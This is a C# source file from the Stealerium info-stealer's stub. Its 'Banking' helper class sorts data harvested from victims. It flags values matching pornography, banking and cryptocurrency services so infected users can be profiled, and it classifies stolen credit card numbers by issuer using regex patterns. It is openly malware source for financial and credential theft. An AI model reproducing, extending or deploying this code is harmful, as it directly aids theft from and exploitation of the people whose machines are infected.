using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace Stealerium.Stub.Helpers
{
    internal sealed class Banking
    {
        // Credit card detection based on number patterns
        private static readonly Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>
        {
            { "Amex Card", new Regex(@"^3[47][0-9]{13}$") },
            { "BCGlobal", new Regex(@"^(6541|6556)[0-9]{12}$") },
            { "Carte Blanche Card", new Regex(@"^389[0-9]{11}$") },
            { "Diners Club Card", new Regex(@"^3(?:0[0-5]|[68][0-9])[0-9]{11}$") },
            { "Discover Card", new Regex(@"6(?:011|5[0-9]{2})[0-9]{12}$") },
            { "Insta Payment Card", new Regex(@"^63[7-9][0-9]{13}$") },
            { "JCB Card", new Regex(@"^(?:2131|1800|35\d{3})\d{11}$") },
            { "KoreanLocalCard", new Regex(@"^9[0-9]{15}$") },
            { "Laser Card", new Regex(@"^(6304|6706|6709|6771)[0-9]{12,15}$") },
            { "Maestro Card", new Regex(@"^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$") },
            { "Mastercard", new Regex(@"5[1-5][0-9]{14}$") },
            { "Solo Card", new Regex(@"^(6334|6767)[0-9]{12,15}$") },
            { "Switch Card", new Regex(@"^(4903|4905|4911|4936|6333|6759)[0-9]{12,15}$") },
            { "Union Pay Card", new Regex(@"^(62[0-9]{14,17})$") },
            { "Visa Card", new Regex(@"4[0-9]{12}(?:[0-9]{3})?$") },
            { "Visa Master Card", new Regex(@"^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$") },
            { "Express Card", new Regex(@"3[47][0-9]{13}$") }
        };

        /// <summary>
        /// Appends a sanitized domain to the list of domains if it passes filters.
        /// </summary>
        /// <param name="value">The URL or domain to check and add.</param>
        /// <param name="domains">The list to append the domain to.</param>
        /// <returns>True if the domain was successfully appended, false otherwise.</returns>
        private static bool AppendValue(string value, List<string> domains)
        {
            // Clean the input domain and convert to lowercase
            string domain = value.Replace("www.", "").ToLower();

            // Skip search engines or known non-target services
            string[] searchEngines = { "google", "bing", "yandex", "duckduckgo" };
            if (searchEngines.Any(domain.Contains))
                return false;

            // Try to extract a valid domain, removing illegal characters manually
            try
            {
                Uri uriResult;
                if (Uri.TryCreate(value, UriKind.Absolute, out uriResult))
                {
                    domain = uriResult.Host;
                }
                else
                {
                    // If it's not a valid URI, strip unwanted characters manually
                    domain = CleanDomain(value);
                }
            }
            catch (UriFormatException)
            {
                // Skip invalid or malformed URLs
                return false;
            }

            // Remove common extensions manually
            string[] commonExtensions = { ".com", ".org", ".net", ".gif" };  // Add more if needed
            foreach (var ext in commonExtensions)
            {
                if (domain.EndsWith(ext))
                {
                    domain = domain.Substring(0, domain.Length - ext.Length);
                    break;
                }
            }

            // Check for duplicates (ignores case and whitespace)
            if (domains.Any(existingDomain => existingDomain.Equals(domain, StringComparison.OrdinalIgnoreCase)))
                return false;

            // Convert domain to title case and add to the list
            domain = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(domain);
            domains.Add(domain);
            return true;
        }

        // Helper method to clean domain of any illegal characters manually
        private static string CleanDomain(string value)
        {
            // Remove characters that are illegal in URLs or file paths
            char[] invalidChars = Path.GetInvalidFileNameChars();
            return new string(value.Where(c => !invalidChars.Contains(c)).ToArray());
        }

        /// <summary>
        /// Scans for specific services (e.g., porn, banking, crypto) in a value and appends to the detected list.
        /// </summary>
        private static void DetectServices(string value, string[] targetServices, List<string> detectedServices, bool onDetect)
        {
            foreach (var service in targetServices)
            {
                if (value.ToLower().Contains(service) && value.Length < 25 && AppendValue(value, detectedServices))
                {
                    return; // Service detected and added, no need to continue
                }
            }
        }

        /// <summary>
        /// Scans data for pornography, banking, or cryptocurrency-related services.
        /// </summary>
        public static void ScanData(string value)
        {
            try
            {
                DetectServices(value, Config.PornServices, Counter.DetectedPornServices, Counter.PornServices);
                DetectServices(value, Config.BankingServices, Counter.DetectedBankingServices, Counter.BankingServices);
                DetectServices(value, Config.CryptoServices, Counter.DetectedCryptoServices, Counter.CryptoServices);
            }
            catch (Exception ex)
            {
                Logging.Log($"Banking - ScanData: Exception while analyzing value '{value}': {ex}");
            }
        }

        /// <summary>
        /// Detects the type of credit card based on its number.
        /// </summary>
        /// <param name="number">The credit card number to check.</param>
        /// <returns>The type of credit card or 'Unknown' if not matched.</returns>
        public static string DetectCreditCardType(string number)
        {
            string sanitizedNumber = number.Replace(" ", "");

            foreach (var cardType in CreditCardTypes)
            {
                if (cardType.Value.IsMatch(sanitizedNumber))
                {
                    return cardType.Key;
                }
            }

            return "Unknown"; // No match found
        }
    }
}
